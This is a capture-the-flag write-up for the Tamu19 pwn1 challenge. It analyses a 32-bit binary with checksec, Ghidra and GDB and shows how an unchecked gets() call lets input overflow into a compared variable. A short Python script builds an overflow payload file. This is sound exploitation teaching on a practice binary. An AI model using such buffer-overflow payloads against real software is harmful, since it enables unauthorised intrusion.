# Tamu19 pwn1 (32-bit)

{% embed url="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tamu19_pwn1/pwn1" %}

## 1. Analysis

### 1.1 Basic

```shellscript
$ file pwn1
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped

$ pwn checksec pwn1
[*] '/home/jarrettgxz/ghidra-projs/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

$ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
hello # input
I don't know that! Auuuuuuuugh!

```

* This tells us that it is a 32-bit ELF
* The following security are implemented:
  * [RELRO](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/reverse-engineering-binary-exploitation/general-knowledge/security-features/relocation-read-only-relro)
  * [No-eXecute ](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/reverse-engineering-binary-exploitation/general-knowledge/security-features/no-execute-nx)(NX) enabled
  * [PIE](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/reverse-engineering-binary-exploitation/general-knowledge/security-features/pie) enabled

### 1.2 Ghidra

#### `main` function (_Decompile_ view)&#x20;

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 main(void)

{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

#### Refined `main` function&#x20;

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 main(void)

{
  int strCompRes0;
  int strCompRes1;
  
  char input [43];
  int target;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  target = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(input,0x2b,_stdin);
  strCompRes0 = strcmp(input,"Sir Lancelot of Camelot\n");
  if (strCompRes0 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(input,0x2b,_stdin);
  strCompRes1 = strcmp(input,"To seek the Holy Grail.\n");
  if (strCompRes1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(input);
  if (target == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

Assuming that all the inputs passes the checks, the program will initially read in `0x2b` bytes of inputs twice into the `input` variable using the `fgets` function, and a final input into the same variable using the `gets` function. Since the `gets` function simply reads the input until a newline character or EOF is encountered, this means that we can overflow the buffer allocated to the `input` and overwrite subsequent portions of the memory.

<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

From the variables listing, we know that the `input` variable has an offset of `0x43`-`0x18`=`0x2b` from the `target` variable.

I will skip the explanation of the rest of the deassembled/decompiled code regarding the comparisons, and the reading of the flag value. Instead, I would like to focus on the calling conventions and analysis of the 32-bit architecture with **GDB**

### 1.3 GDB

```shellscript
$ gdb pwn1

gdb> starti
gdb> disass main
Dump of assembler code for function main:
...
0x565558a9 <+304>:   push   eax
0x565558aa <+305>:   call   0x56555520 <gets@plt>
0x565558af <+310>:   add    esp,0x10
0x565558b2 <+313>:   cmp    DWORD PTR [ebp-0x10],0xdea110c8
...
```

The following instruction corresponds to the following line in the decompiled code:

```c
  gets(input);
  if (target == -0x215eef38) {
   ...
```







From analysis of the source code in _Ghidra_, we know that we are required to input the values `Sir Lancelot of Camelot\n` and `To seek the Holy Grail.\n` to the initial 2 inputs. Following, we can input a crafted payload to overwrite a portion of memory to bypass the checks.

We can use the following commands to create an input binary which simply overwrites the required portion of memory with `\x12\x34\x56\x78`:

<pre class="language-shellscript"><code class="lang-shellscript"><strong>$ python3 - &#x3C;&#x3C; 'EOF' > pwn1.bin
</strong>import sys

sys.stdout.buffer.write(b"Sir Lancelot of Camelot\n")
sys.stdout.buffer.write(b"To seek the Holy Grail.\n")

payload=b'0'*0x2b
payload+=b'\x12\x34\x56\x78'
sys.stdout.buffer.write(payload)
EOF
</code></pre>









* Notice that the offset value (between the `input` and `compare`) `0x2b` is equals to **43** in decimal, which is the size declared in the decompiled C code:

```c
char input [43];
```



